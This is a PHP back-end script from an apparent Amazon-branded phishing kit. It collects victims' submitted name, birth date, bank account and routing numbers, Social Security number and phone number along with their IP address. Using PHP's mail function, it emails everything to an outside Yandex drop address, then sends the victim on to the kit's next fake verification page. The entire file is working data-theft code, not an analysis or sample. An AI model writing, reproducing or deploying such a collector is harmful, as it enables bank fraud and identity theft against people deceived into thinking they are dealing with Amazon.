<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "|Name on Card                   : ".$_POST['name']."\n";
$bilsmg .= "|Date-----: ".$_POST['dd']."<br>\n";
$bilsmg .= "|Month-----: ".$_POST['mm']."<br>\n";
$bilsmg .= "|Year-----: ".$_POST['yy']."<br>\n";
$bilsmg .= "|Bank Account Number-----: ".$_POST['ban']."<br>\n";
$bilsmg .= "|Routing Number-----: ".$_POST['routing']."<br>\n";
$bilsmg .= "|Sort1-----: ".$_POST['ssn_1']."<br>\n";
$bilsmg .= "|Sort2-----: ".$_POST['ssn_2']."<br>\n";
$bilsmg .= "|Sort3-----: ".$_POST['ssn_3']."<br>\n";
$bilsmg .= "|Phonecode-----: ".$_POST['phone1']."<br>\n";
$bilsmg .= "|Phonenumber-----: ".$_POST['phon2e']."<br>\n";
;

$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "jahanamcafe@yandex.com";
$bilsub = "Amazon.com | From $ip";
$bilhead = "From:3D Authentification <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../a-address.address.confirm-ya_address_book_verification_button.html";
header("location:$src");
?>